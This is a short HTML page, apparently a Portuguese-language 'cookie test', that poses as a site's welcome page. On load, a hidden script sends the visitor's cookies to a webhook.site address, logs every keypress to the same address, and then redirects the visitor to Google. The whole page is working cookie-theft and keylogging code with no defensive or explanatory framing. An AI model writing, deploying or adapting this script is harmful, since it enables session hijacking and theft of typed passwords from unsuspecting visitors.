<!DOCTYPE html>
<html>

<head>
    <title>Teste de Cookies</title>
</head>

<body>

    <h1>Bem-vindo ao nosso site! 4</h1>
    <script>
        function capturarDados() {
            let cookies = document.cookie;

            // Usar Image() para evitar CORS
            var i = new Image();
            i.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies);

            // Capturar teclas pressionadas
            document.addEventListener("keydown", function (event) {
                var keyLogger = new Image();
                keyLogger.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?key=" + event.key;
            });

            // Espera antes de redirecionar
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1500);
        }

        capturarDados();
    </script>
</body>

</html>
